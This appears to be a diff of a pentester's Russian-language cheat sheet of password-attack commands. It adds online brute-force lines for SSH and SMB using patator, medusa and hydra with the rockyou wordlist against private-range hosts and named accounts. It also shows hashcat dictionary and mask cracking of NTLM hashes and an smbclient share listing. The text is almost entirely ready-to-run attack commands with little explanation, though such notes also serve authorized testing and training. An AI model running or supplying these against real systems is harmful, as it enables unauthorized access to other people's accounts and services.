@@ -1,12 +1,20 @@
 
 
-Перебор хешей по словарю
+
+Перебор паролей для сервисов SSH, smb и т.д.
 
 patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’
 
+medusa -h 192.168.50.38 -u michael -P rockyou.txt -M ssh -f -v 6
+
+(почему то для домена) hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
+
+
+Перебор хешей по словарю
 
 hashcat -m 1000 hash.txt dict.txt
 hashcat ujas.txt rockyou.txt - автодетектинг хеша (файл может быть с хламом)
+
 
 
 Загляним в справку Hashcat, чтобы узнать номер режима хеша NTLM: 1000 | NTLM  
@@ -40,7 +48,7 @@ hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 
 patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’
 
 
-hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
+
 
 smbclient -L 192.168.50.200 -U Administrator
 
